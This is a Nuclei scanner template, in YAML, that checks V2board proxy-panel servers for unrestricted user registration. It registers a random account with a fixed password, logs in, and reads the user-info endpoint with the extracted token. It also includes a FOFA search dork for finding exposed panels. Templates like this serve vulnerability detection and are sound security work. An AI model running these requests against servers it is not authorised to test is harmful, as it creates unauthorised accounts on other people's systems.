id: v2board-Any-user-registration
info:
  name: v2board 未受限制任意用户注册
  author: wjlin0
  severity: medium
  description: V2board是一个多用户代理工具管理面板。在其1.6.1版本中,引入了对于用户Session的缓存机制,服务器会将用户的认证信息储存在Redis缓存中。
  metadata:
    fofa-dork: '"v2board"'
  tags: v2board
variables:
  username: "{{to_lower(rand_base(6))}}@gmail.com" 
http:
  - raw:
      - |+
        POST /api/v1/passport/auth/register HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Connection: close

        email={{username}}&password=12345678&invite_code=&email_code=
      
      - |+
        POST /api/v1/passport/auth/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Connection: close
        
        email={{username}}&password=12345678&invite_code=&email_code=

      - |+
        GET /api/v1/user/info HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        authorization: {{auth_data}}
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        part: body_1
        words:
          - "data"
          - "token"
          - "auth_data"
        condition: and
      - type: word
        part: body_2
        words:
          - "data"
          - "token"
          - "auth_data"
        condition: and
      - type: word
        part: body_3
        words:
          - "data"
          - "email"
          - "last_login_at"
        condition: and
    
    extractors:
      - type: regex
        part: body_1
        name: auth_data
        group: 1
        internal: true
        regex:
          - "\"auth_data\":\"(.*)\""
      - type: regex
        part: body_2
        name: auth_data
        group: 1
        internal: true
        regex:
          - "\"auth_data\":\"(.*)\""
      - type: json
        part: body_3
        name: url
        json:
          - ".data| .email"
